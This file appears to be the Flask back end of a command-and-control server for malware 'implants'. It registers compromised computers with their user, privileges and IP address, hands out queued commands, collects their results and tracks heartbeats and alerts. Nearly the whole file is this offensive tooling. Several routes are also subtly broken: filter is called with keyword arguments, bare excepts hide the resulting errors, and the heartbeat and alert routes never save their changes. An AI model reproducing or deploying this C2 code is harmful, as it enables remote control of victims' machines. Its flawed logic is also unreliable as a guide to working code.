import functools

from datetime import datetime


from flask import (
    Blueprint, flash, g, redirect, render_template, request, session, url_for, jsonify
)
from sqlalchemy.exc import IntegrityError
from werkzeug.security import check_password_hash, generate_password_hash

from .db import db
from .models import Implant, Command, Alert

bp = Blueprint('implant', __name__)

# register


@bp.route('/register', methods=['POST'])
def register():
    try:
        if request.method == 'POST':
            imp_id = request.json['implant_id']
            now = datetime.now()
            current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
            cmp_name = request.json['computer_name']
            user_name = request.json['computer_user']
            computer_GUID = request.json['computer_GUID']
            cmp_prev = request.json['computer_privileges']
            ip = request.json['connecting_ip_address']
            #session_key = request.json["session_key"]
            first_seen = current_date_time
            last_seen = current_date_time

            error = None

            if not imp_id:
                error = 'Id is required.'

            if error is None:
                try:
                    implant = Implant.query.filter(implant_id=imp_id)
                    if implant:
                        implant.computer_name = cmp_name
                        implant.computer_user = user_name
                        implant.last_seen = last_seen

                        db.session.commit()

                        print("Implant updated")

                    else:
                        implant = Implant(
                            implant_id=imp_id,
                            computer_name=cmp_name,
                            computer_user=user_name,
                            computer_GUID=computer_GUID,
                            computer_privileges=cmp_prev,
                            connecting_ip_address=ip,
                            # session_key=session_key,
                            first_seen=first_seen,
                            last_seen=last_seen
                        )
                        db.session.add(implant)
                        db.session.commit()
                        print("Implant added")
                        return jsonify({"status":"good job"})
                except:
                    pass
            else:
                print("Alert: somone is trying to play with us")

            flash(error)
    except:
        print("error")
        pass


@bp.route('/getNextCommand', methods=['POST'])
def get_next_command():
    if request.method == 'POST':
        try:
            impl_id = request.json["implant_id"]

            if impl_id:
                commands = Command.query.filter(
                    implant_id=impl_id, status="not_taken_by_implant")
                if commands:
                    first_value = commands.first()
                    command = first_value.command_text
                    now = datetime.now()
                    current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                    cmd_id = first_value.command_id
                    first_value.time_issued = current_date_time
                    first_value.status = "taken_by_implant"
                    db.session.commit()
                    return jsonify({"command_id": cmd_id, "command": command})
                else:
                    return jsonify({"command_id": -1, "command": "No command"})
        except:
            pass


@bp.route('/sendCommandResult', methods=['POST'])
def store_command_results():
    if request.method == 'POST':
        try:
            impl_id = request.json["implant_id"]
            cmd_id = request.json["command_id"]
            result = request.json["result"]

            if impl_id:
                commands = Command.query.filter(implant_id=impl_id, status="taken_by_implant",
                                                command_id=cmd_id)
                if commands:
                    commands.command_result = result
                    commands.status = "completed"
                    db.session.commit()
                    return jsonify({"status": "Result posted"})
                else:
                    return jsonify({"status": "Error in posting result"})
        except:
            pass


@bp.route('/hearbeat', methods=['POST'])
def heartbeat():
    if request.method == 'POST':
        try:
            imp_id = request.json['implant_id']
            try:
                implant = Implant.query.filter(implant_id=imp_id)
                now = datetime.now()
                current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                implant.last_seen = current_date_time
                return jsonify({"status": "keep Alive"})
            except:
                return jsonify({"status": "register first"})
        except:
            pass


@bp.route('/alert', methods=['POST'])
def alert():
    if request.method == 'POST':
        try:
            imp_id = request.json['implant_id']
            alert = request.json['alert']
            try:
                now = datetime.now()
                current_date_time = now.strftime("%d/%m/%Y %H:%M:%S")
                alert = Alert(implant_id=imp_id,
                              time_reported=current_date_time, alert=alert)
                return jsonify({"status": "Alert Registered"})
            except:
                return jsonify({"status": "Bad alert"})
        except:
            pass
